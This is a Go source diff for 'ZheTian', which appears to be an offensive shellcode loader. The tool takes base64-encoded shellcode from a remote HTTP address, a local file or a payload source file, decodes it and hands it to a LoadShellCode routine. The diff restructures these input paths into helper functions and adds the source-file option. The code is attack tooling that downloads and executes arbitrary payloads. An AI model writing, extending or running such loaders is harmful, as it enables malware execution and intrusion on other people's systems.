@@ -1,4 +1,4 @@
-package sub
+package server
 
 import (
 	"encoding/base64"
@@ -6,14 +6,13 @@ import (
 	"errors"
 	"fmt"
 	"github.com/spf13/cobra"
-	"io/ioutil"
-	"net/http"
 	"os"
 )
 
 var (
 	Uri           string //远程资源路径
 	FilePath      string //本地资源路径
+	Resource      string //源文件
 	ShellCodeByte []byte
 	rootCmd       = &cobra.Command{
 		Use:   "ZheTian",
@@ -31,8 +30,9 @@ var (
 
 //初始化
 func init() {
-	rootCmd.PersistentFlags().StringVarP(&Uri, "Uri", "u", "", "HTTP service address hosting shellCode")
-	rootCmd.PersistentFlags().StringVarP(&FilePath, "FilePath", "r", "", "read from local file")
+	rootCmd.PersistentFlags().StringVarP(&Uri, "Uri", "u", "", "HTTP service address hosting shellCode byte file")
+	rootCmd.PersistentFlags().StringVarP(&FilePath, "FilePath", "r", "", "read from local byte file")
+	rootCmd.PersistentFlags().StringVarP(&Resource, "Payload Resource", "s", "", "read payload source file,Supported lang:java、C、python、ruby、c#、perl、ruby...")
 }
 
 //Execute 挂载cli，等待执行
@@ -42,7 +42,7 @@ func Execute() {
 		return
 	}
 	if err := rootCmd.Execute(); err != nil {
-		os.Exit(1)
+		panic(err.Error())
 	}
 }
 
@@ -51,27 +51,17 @@ func Execute() {
 //c or python 类型需去除\x
 //示例：fc4883e4f0e8c8000000415141
 func startService() error {
-	//不为空就进入
+
+	//只能输入一个。就算输入多个也不会全部执行
 	if Uri != "" {
-		resp, err := http.Get(Uri)
-		if err != nil {
-			return errors.New(err.Error())
-		}
-		body, err := ioutil.ReadAll(resp.Body)
-		if err != nil {
-			return errors.New(err.Error())
-		}
-		ShellCodeByte = body
+		UriModel()
 	} else if FilePath != "" {
-		file, err := os.Open(FilePath)
-		if err != nil {
-			return errors.New(err.Error())
-		}
-		body, err := ioutil.ReadAll(file)
-		if err != nil {
-			return errors.New(err.Error())
-		}
-		ShellCodeByte = body
+		ReadFileModel()
+	} else if Resource != "" {
+		ResourceModel()
+	} else {
+		fmt.Println("\nRun command: ZheTian -help")
+		os.Exit(0)
 	}
 	decodeBytes, err := base64.StdEncoding.DecodeString(string(ShellCodeByte))
 	if err != nil {
@@ -82,5 +72,4 @@ func startService() error {
 		LoadShellCode(shellCode)
 	}
 	return errors.New(err.Error())
-
 }
